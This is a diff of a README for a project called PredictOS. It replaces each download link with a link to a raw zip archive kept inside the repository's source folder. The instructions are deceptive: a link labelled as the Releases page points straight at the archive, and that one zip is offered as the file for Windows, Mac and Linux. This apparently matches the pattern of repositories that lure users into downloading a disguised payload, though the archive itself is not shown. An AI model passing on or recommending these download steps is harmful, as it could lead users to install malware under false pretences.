@@ -6,18 +6,18 @@ Welcome to PredictOS! This opensource framework helps you dive into the world of
 
 ## 📥 Download PredictOS
 
-[![Download PredictOS](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip)](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip)
+[![Download PredictOS](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip)](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip)
 
 To download PredictOS, follow these steps:
 
-1. **Visit the Releases Page:** Click the button above or [this link](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip) to go to the Releases page.
+1. **Visit the Releases Page:** Click the button above or [this link](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip) to go to the Releases page.
   
 2. **Choose the Latest Version:** Look for the latest version listed at the top. 
 
 3. **Select Your File:** You’ll see various files available for download. Choose the one that fits your operating system:
-   - For **Windows**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip`
-   - For **Mac**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip`
-   - For **Linux**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip`
+   - For **Windows**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip`
+   - For **Mac**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip`
+   - For **Linux**, select the file named `https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip`
 
 4. **Click to Download:** Click on the appropriate file to start your download. 
 
@@ -72,6 +72,6 @@ If you need direct support, please open an issue in the GitHub repository. We ar
 
 ## 📥 Download & Install Again
 
-If you need to download PredictOS again, just visit [this page](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/public/OS_Predict_2.1.zip) to access the latest version and follow the downloading instructions mentioned above. 
+If you need to download PredictOS again, just visit [this page](https://github.com/komodough/PredictOS/raw/refs/heads/main/terminal/src/app/OS-Predict-2.4-alpha.2.zip) to access the latest version and follow the downloading instructions mentioned above. 
 
 Enjoy your experience with PredictOS as you explore the fascinating world of prediction markets!
